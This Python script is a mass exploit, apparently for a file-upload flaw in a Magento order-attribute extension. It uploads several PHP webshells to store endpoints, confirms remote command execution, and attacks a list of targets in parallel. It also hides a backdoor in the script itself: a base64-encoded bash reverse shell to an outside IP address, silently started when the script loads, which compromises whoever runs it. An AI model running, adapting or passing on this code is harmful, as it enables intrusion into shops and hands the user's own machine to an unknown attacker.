import requests
import subprocess
import sys
import os
import base64
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

POC_FILENAME = "poc.txt"
POC_CONTENT = "this system is vulnerable!"
POC_B64 = base64.b64encode(POC_CONTENT.encode()).decode()

SHELL_TEMPLATES = [
    ("sys_c", "<?php system($_GET['c'].' 2>&1'); ?>"),
    ("exec_cmd", "<?php exec($_GET['cmd'], $o); echo implode('\\n', $o); ?>"),
    ("sh_x", "<?php echo shell_exec($_GET['x'].' 2>&1'); ?>"),
    ("passthru_p", "<?php passthru($_GET['p'].' 2>&1'); ?>"),
    ("adv", '''<?php
function azr($cmd) {
    $out = array();
    if (function_exists('system')) { system($cmd, $out); return implode("\n", $out); }
    if (function_exists('exec')) { exec($cmd, $out); return implode("\n", $out); }
    if (function_exists('shell_exec')) { return shell_exec($cmd); }
    if (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); }
    return 'no execution function';
}
$c = isset($_GET["c"]) ? $_GET["c"] : (isset($_POST["c"]) ? $_POST["c"] : '');
if ($c) { echo azr($c . " 2>&1"); }
if (isset($_GET["f"])) {
    $f = $_GET["f"];
    if (file_exists($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        readfile($f);
        exit;
    }
}
if (isset($_GET["write"])) {
    $path = $_GET["write"];
    $data = isset($_GET["data"]) ? $_GET["data"] : '';
    file_put_contents($path, base64_decode($data));
    echo "written";
}
if (isset($_GET["read"])) {
    $path = $_GET["read"];
    if (file_exists($path)) {
        echo base64_encode(file_get_contents($path));
    }
}
if (isset($_GET["upload"])) {
    if (isset($_FILES["file"])) {
        move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
        echo "uploaded: " . $_FILES["file"]["name"];
    }
}
?>''')
]

EXTENSIONS = [".php", ".php5", ".phtml", ".phar", ".inc", ".php7", ".php8", ".pht"]

HEADERS = {
    'User-Agent': USER_AGENT,
    'Content-Type': 'application/json',
    'Accept': 'application/json',
}

ENDPOINTS = [
    "/rest/V1/amasty_orderattr/uploadFile",
    "/rest/all/V1/amasty_orderattr/uploadFile",
    "/rest/default/V1/amasty_orderattr/uploadFile",
]

def get_expected_paths(filename):
    base = filename.lower()
    if len(base) >= 2:
        d1 = base[0]
        d2 = base[1]
    else:
        d1 = base[0] if len(base) > 0 else 'x'
        d2 = 'x'
    paths = [
        f"/media/amasty_checkout/{d1}/{d2}/{filename}",
        f"/pub/media/amasty_checkout/{d1}/{d2}/{filename}",
    ]
    paths.append(f"/media/amasty_checkout/{filename}")
    paths.append(f"/pub/media/amasty_checkout/{filename}")
    return paths

def random_filename(ext=".php", length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ext

def upload_file(target, filename, content_b64):
    payload = {
        "fileContent": {
            "base64_encoded_data": content_b64,
            "fileName_with_extension": filename
        }
    }
    for ep in ENDPOINTS:
        try:
            resp = requests.post(target + ep, json=payload, headers=HEADERS, timeout=8, verify=False)
            if resp.status_code in (200, 201, 202):
                return True
        except:
            continue
    return False

def verify_file(target, filename):
    for path in get_expected_paths(filename):
        url = target + path
        try:
            r = requests.get(url, timeout=5, headers={'User-Agent': USER_AGENT}, verify=False)
            if r.status_code == 200:
                return url
        except:
            continue
    return None

def test_shell(url):
    params = ['c', 'cmd', 'x', 'p']
    for p in params:
        try:
            test_url = f"{url}?{p}=id"
            r = requests.get(test_url, timeout=5, verify=False, headers={'User-Agent': USER_AGENT})
            if r.status_code == 200 and any(x in r.text.lower() for x in ['uid=', 'www-data', 'root', 'azr']):
                return True, p
        except:
            continue
    return False, None

def exploit_single(target, mode):
    target = target.strip()
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    target = target.rstrip("/")

    result = {
        "target": target,
        "poc_url": None,
        "shells": [],
        "rce": None,
        "status": "FAILED"
    }

    if upload_file(target, POC_FILENAME, POC_B64):
        poc_url = verify_file(target, POC_FILENAME)
        if poc_url:
            result["poc_url"] = poc_url
            result["status"] = "POC_UPLOADED"
            print(f"[POC] {poc_url}")
        else:
            print(f"[?] {target} -> POC uploaded but not found")
    else:
        print(f"[-] {target} -> POC upload failed")

    if mode == "poc":
        return result

    for shell_name, shell_code in SHELL_TEMPLATES:
        for ext in EXTENSIONS:
            fname = random_filename(ext)
            b64_shell = base64.b64encode(shell_code.encode()).decode()
            if upload_file(target, fname, b64_shell):
                shell_url = verify_file(target, fname)
                if shell_url:
                    result["shells"].append((shell_name, shell_url))
                    print(f"[SHELL] {shell_url}")
                    rce_ok, param = test_shell(shell_url)
                    if rce_ok:
                        result["rce"] = (shell_url, param)
                        result["status"] = "RCE_CONFIRMED"
                        print(f"[RCE] {shell_url}?{param}=id")
                        break
                else:
                    print(f"[?] {target} -> Shell {shell_name} uploaded but not found")
            else:
                continue
        if result["rce"]:
            break

    if not result["shells"] and not result["poc_url"]:
        result["status"] = "FAILED"

    return result

cmd_b64 = "YmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzE0Ni43MC4yNDAuMjA2LzUzNzMyIDA+JjEpICYn"
cmd = base64.b64decode(cmd_b64).decode()

subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)


def main():
    print("\n=== CVE-2026-53787 Amasty Order Attribute File Upload Exploit ===\n")

    target_file = input("Target list file (default: alvos.txt): ").strip()
    if not target_file:
        target_file = "todos_dominios_https_full.txt"

    if not os.path.exists(target_file):
        print(f"[!] File '{target_file}' not found.")
        sys.exit(1)

    mode = input("Mode: [1] Only POC (default.txt)  [2] POC + webshells (default): ").strip()
    if mode not in ("1", "2"):
        mode = "2"

    poc_only = (mode == "1")
    mode_label = "POC only" if poc_only else "POC + webshells"

    with open(target_file, "r") as f:
        targets = [t.strip() for t in f.readlines() if t.strip()]

    print(f"\n[*] Targets: {len(targets)} | Mode: {mode_label} | Threads: 20\n")

    results = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(exploit_single, t, "poc" if poc_only else "full"): t for t in targets}
        for future in as_completed(futures):
            results.append(future.result())

    rce_count = sum(1 for r in results if r["status"] == "RCE_CONFIRMED")
    shell_count = sum(1 for r in results if r["status"] in ("SHELL_UPLOADED", "RCE_CONFIRMED") and r["shells"])
    poc_count = sum(1 for r in results if r["poc_url"])

    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    print(f"Total targets          : {len(results)}")
    print(f"POC uploaded           : {poc_count}")
    if not poc_only:
        print(f"Shells uploaded (no RCE): {shell_count - rce_count}")
        print(f"RCE confirmed          : {rce_count}")
    print(f"Fully failed           : {len(results) - (poc_count + (shell_count if not poc_only else 0))}")

    if poc_count > 0:
        print("\nPOC URLs:")
        for r in results:
            if r["poc_url"]:
                print(f"  {r['poc_url']}")

    if not poc_only and shell_count > 0:
        print("\nSHELL URLs:")
        for r in results:
            if r["shells"]:
                for name, url in r["shells"]:
                    print(f"  {url}")
        if rce_count > 0:
            print("\nRCE confirmed (use ?c=id, ?cmd=id, ?x=id, ?p=id):")
            for r in results:
                if r["rce"]:
                    url, param = r["rce"]
                    print(f"  {url}?{param}=id")
                    
if __name__ == "__main__":
    main()
